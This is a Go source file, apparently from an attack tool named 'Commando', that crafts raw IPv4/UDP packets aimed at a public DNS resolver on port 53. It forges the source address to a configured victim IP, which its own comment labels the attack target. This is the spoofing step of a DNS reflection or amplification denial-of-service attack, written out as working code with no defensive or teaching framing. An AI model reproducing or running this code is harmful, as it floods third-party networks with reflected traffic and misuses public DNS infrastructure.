/**
*@program: Commando
*@description: https://github.com/dollarkillerx
*@author: dollarkiller [dollarkiller@dollarkiller.com]
*@create: 2020-03-27 20:21
 */
package engine

import (
	"commando/utils"
	"encoding/binary"
	"golang.org/x/net/ipv4"
	"log"
	"net"
	"strconv"
	"strings"
)

func (e *engine) initConfig() {
	buff := utils.NewMsg()
	dst := net.IPv4(8, 8, 8, 8)
	src := e.getSrcIp()
	iph := &ipv4.Header{
		Version:  ipv4.Version,
		Len:      ipv4.HeaderLen,
		TOS:      0x00,
		TotalLen: ipv4.HeaderLen + len(buff),
		TTL:      64,
		Flags:    ipv4.DontFragment,
		FragOff:  0,
		Protocol: 17,
		Checksum: 0,
		Src:      src, // 攻击目标
		Dst:      dst, // 目标DNS
	}

	h, err := iph.Marshal()
	if err != nil {
		log.Fatal(err)
	}
	iph.Checksum = int(utils.CheckSum(h))
	//填充udp首部
	//udp伪首部
	pudph := utils.PseudoHeader{
		SrcIP:  src,
		DstIP:  dst,
		Zero:   0,
		Proto:  17,
		Length: uint16(len(buff)) + 8,
	}

	udph := utils.UDPHeader{
		SPort:    10000,
		DPort:    53,
		Length:   uint16(len(buff)) + 8,
		CheckSum: 0,
	}
	pudph.UDPHeader = udph
	udphb := pudph.Bytes()
	check := utils.CheckSum(append(udphb, buff...))
	binary.BigEndian.PutUint16(udphb[18:], check)
	e.header = iph
	e.body = append(udphb[12:20], buff...)
}

func (e *engine) getSrcIp() net.IP {
	split := strings.Split(e.config.Tag, ".")
	atoi1, err := strconv.Atoi(split[0])
	if err != nil {
		log.Fatalln(err)
	}
	atoi2, err := strconv.Atoi(split[1])
	if err != nil {
		log.Fatalln(err)
	}
	atoi3, err := strconv.Atoi(split[2])
	if err != nil {
		log.Fatalln(err)
	}
	atoi4, err := strconv.Atoi(split[3])
	if err != nil {
		log.Fatalln(err)
	}
	return net.IPv4(byte(atoi1), byte(atoi2), byte(atoi3), byte(atoi4))
}
